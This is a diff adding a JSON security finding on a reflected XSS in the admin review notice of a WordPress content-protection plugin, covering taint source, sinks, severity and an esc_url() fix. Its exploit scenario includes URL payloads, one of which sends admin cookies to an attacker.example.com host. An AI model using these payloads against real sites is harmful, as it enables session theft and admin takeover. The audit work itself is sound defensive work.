@@ -1,0 +1,93 @@
+{
+  "finding_id": "wccp-reflected-xss-request-uri",
+  "plugin_slug": "wp-content-copy-protector",
+  "plugin_version": "3.7",
+  "review_date": "2026-06-16",
+  "title": "Reflected XSS via Unescaped REQUEST_URI in Admin Review Notice Links",
+  "severity": "medium",
+  "cvss_score": 4.8,
+  "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:H/UI:R/S:C/C:L/I:L/A:N",
+  "vulnerability_class": "xss",
+  "subtype": "reflected",
+  "cwe": "CWE-79",
+
+  "affected_file": "notifications.php",
+  "affected_lines": [123, 124, 125, 127, 128, 144, 145, 146],
+
+  "description": "The function wccp_free_review_notice_message() (notifications.php:121) constructs dismiss and 'remind later' URLs by directly concatenating $_SERVER['REQUEST_URI'] without URL-safe HTML escaping, then echoes them into href attributes of anchor tags without applying esc_url(). WordPress's wp_nonce_url() only appends a nonce query parameter — it does not HTML-encode the URL for safe embedding in an href context. This creates a reflected XSS vulnerability in the WordPress admin panel.",
+
+  "taint_source": {
+    "variable": "$_SERVER['REQUEST_URI']",
+    "file": "notifications.php",
+    "line": 123,
+    "note": "wp_parse_url() is only used to check if query string exists (to pick '?' vs '&'); the raw REQUEST_URI is used directly at lines 124 and 127"
+  },
+
+  "sink_instances": [
+    {
+      "variable": "$dismiss_url",
+      "file": "notifications.php",
+      "line": 144,
+      "html_context": "<a href=\"<?php echo $dismiss_url ?>\">",
+      "link_label": "I've already left a review"
+    },
+    {
+      "variable": "$later_url",
+      "file": "notifications.php",
+      "line": 145,
+      "html_context": "<a href=\"<?php echo $later_url ?>\">",
+      "link_label": "Will Rate Later"
+    },
+    {
+      "variable": "$dismiss_url",
+      "file": "notifications.php",
+      "line": 146,
+      "html_context": "<a href=\"<?php echo $dismiss_url ?>\">",
+      "link_label": "Hide Forever"
+    }
+  ],
+
+  "missing_sanitizer": "esc_url() must be applied to all URL outputs in href attributes. Additionally, $_SERVER['REQUEST_URI'] should be sanitized before concatenation.",
+
+  "exploit_scenario": {
+    "summary": "Attacker tricks admin into clicking a crafted URL containing a malicious payload in the URI path or query string.",
+    "prerequisites": [
+      "Plugin must have been active for more than 5 days (432000 seconds) — OR developer mode enabled",
+      "Admin has not previously dismissed the review notice",
+      "Victim must be an authenticated WordPress admin (manage_options capability)",
+      "Victim must be induced to navigate to a crafted admin URL"
+    ],
+    "steps": [
+      "1. Attacker crafts a URL to a WordPress admin page with a malicious REQUEST_URI, e.g.: https://victim.example.com/wp-admin/admin.php?page=any%22%20onmouseover%3D%22alert(document.cookie)",
+      "2. Attacker sends this URL to the admin via phishing, support link, etc.",
+      "3. Admin opens the URL while logged in; the review notice is shown (if conditions met)",
+      "4. The href attribute of the 'dismiss' / 'remind later' links contains the injected payload",
+      "5. Admin interaction (mouseover, click) triggers JavaScript execution in admin context",
+      "6. Attacker can steal admin cookies, perform CSRF-bypassing actions, escalate privileges"
+    ],
+    "poc_payload": "/wp-admin/index.php/%22%20onmouseover=%22fetch('https://attacker.example.com/?c='+document.cookie)%22%20x=%22"
+  },
+
+  "impact": {
+    "confidentiality": "low-medium — admin session cookies/tokens could be stolen",
+    "integrity": "low-medium — attacker can perform admin actions via injected JS",
+    "availability": "none",
+    "scope": "changed — JS executes in admin browser origin"
+  },
+
+  "auth_required": "admin (manage_options capability)",
+  "nonce_context": "Nonce is verified for the dismiss/later ACTION (prevents CSRF on the dismissal operation itself), but does not protect against XSS in the URL output",
+  "attack_complexity": "high",
+
+  "remediation": {
+    "primary_fix": "Apply esc_url() to all echoed URLs in href attributes:\n  Line 144: <a href=\"<?php echo esc_url($dismiss_url); ?>\">\n  Line 145: <a href=\"<?php echo esc_url($later_url); ?>\">\n  Line 146: <a href=\"<?php echo esc_url($dismiss_url); ?>\">\n\nAlso sanitize the base URL before building dismiss/later URLs:\n  $base_url = esc_url_raw($_SERVER['REQUEST_URI']);\n  $url = $base_url . $scheme . 'wccp_free_review_dismiss=yes';",
+    "defense_in_depth": "Consider using wp_safe_redirect() pattern or building URLs from known-safe components rather than directly using REQUEST_URI."
+  },
+
+  "references": [
+    "https://developer.wordpress.org/reference/functions/esc_url/",
+    "https://developer.wordpress.org/reference/functions/esc_url_raw/",
+    "https://owasp.org/www-community/attacks/xss/",
+    "CWE-79: Improper Neutralization of Input During Web Page Generation"
+  ]
+}
